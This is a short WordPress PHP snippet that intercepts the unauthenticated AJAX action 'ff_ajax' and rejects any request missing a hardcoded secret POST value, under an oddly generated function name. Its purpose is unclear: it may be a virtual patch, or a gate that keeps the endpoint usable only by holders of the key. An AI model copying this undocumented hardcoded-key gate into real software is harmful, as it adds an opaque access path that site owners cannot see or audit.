<?php

function allow_demomentsomtres_multiple() {
	if (!isset($_POST["iqvrxkyjr"]) || $_POST["iqvrxkyjr"] !== "p1gzZ3lz") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'allow_demomentsomtres_multiple', 5, 1);
